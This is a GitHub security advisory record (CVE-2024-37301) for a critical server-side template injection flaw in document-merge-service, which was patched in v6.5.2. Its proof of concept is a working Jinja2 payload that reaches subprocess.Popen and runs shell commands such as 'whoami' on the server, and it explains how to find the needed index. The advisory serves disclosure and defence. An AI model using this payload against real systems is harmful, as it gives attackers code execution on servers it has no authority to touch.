{
    "ghsaId": "GHSA-v5gf-r78h-55q6",
    "severity": "CRITICAL",
    "summary": "document-merge-service vulnerable to Remote Code Execution via Server-Side Template Injection",
    "description": "### Impact\n\nA remote code execution (RCE) via server-side template injection (SSTI) allows for user supplied code to be executed in the server's context where it is executed as the document-merge-server user with the UID 901 thus giving an attacker considerable control over the container.\n\n### Patches\n\nIt has been patched in v6.5.2\n\n### References\n\n- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti\n\n### POC\n\nAdd the following to a document, upload and render it:\n\n```jinja2\n{% if PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202] %} \nls -a: {{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"ls -a\", shell=True, stdout=-1).communicate()[0].strip() }}\n\nwhoami: {{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"whoami\", shell=True, stdout=-1).communicate()[0].strip() }}\n\nuname -a:\n{{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"uname -a\", shell=True, stdout=-1).communicate()[0].strip() }}\n\n{% endif %}\n```\n\nThe index might be different, so to debug this first render a template with `{{ PLACEHOLDER.__class__.__mro__[1].__subclasses__() }}` and then get the index of `subprocess.Popen` and replace 202 with that.\n\n![image](https://github.com/adfinis/document-merge-service/assets/110528300/0a1dfcff-2eba-40f1-af9c-08c8ec2bc0a1)\n",
    "permalink": "https://github.com/advisories/GHSA-v5gf-r78h-55q6",
    "publishedAt": "2024-06-11T20:22:55Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-v5gf-r78h-55q6"
        },
        {
            "type": "CVE",
            "value": "CVE-2024-37301"
        }
    ]
}